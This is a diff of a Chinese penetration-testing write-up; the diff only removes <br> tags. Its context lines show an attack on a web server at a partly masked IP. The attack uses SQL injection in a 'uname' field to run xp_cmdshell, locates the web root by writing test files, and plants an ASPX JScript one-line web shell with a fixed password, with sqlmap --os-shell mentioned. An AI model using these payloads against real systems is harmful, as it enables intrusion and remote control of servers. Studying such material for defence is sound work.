@@ -85,7 +85,7 @@ RECONFIGURE;
 
 本来想使用sqlmap的-\-os-shell直接执行命令试试，python sqlmap.py -r 1.txt --os-shell，但是发现执行命令的话一直没有数据返回
 
-<br>
+
 那就手工注入找路径，先建表，将路径插入表，然后得到表内容
 
 ```
@@ -127,7 +127,7 @@ D:\WEBAPP\Content\layer\
 uname=test';exec master..xp_cmdshell 'echo test >D:\bak\20170226\bak\20170403.2\webapp\Content\layer\11.txt';--
 ```
 依次写文件然后访问，在写入 ```D:\bak\20170226\webapp\Content\layer\123.txt```时，访问```http://111.*.*.59/Content/layer/123.txt```能正常访问到123.txt，返回内容为test，证明web路径就是D:\bak\20170226\webapp\
-<br>
+
 尝试写入一句话(< >的前面要加^)
 ```sql
 uname=test';exec master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.item["Aa1234567"],"unsafe");%^> > D:\bak\20170226\webapp\Content\layer\cc.aspx';--
@@ -175,7 +175,7 @@ IF(UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(tmp1 AS NVARCHAR(4000)),CHAR(32))) 
 ```
 
 
-<br>
+
 #### Reference(侵删)：
 * [https://www.cnblogs.com/backlion/p/6869595.html](https://www.cnblogs.com/backlion/p/6869595.html?_blank)
 
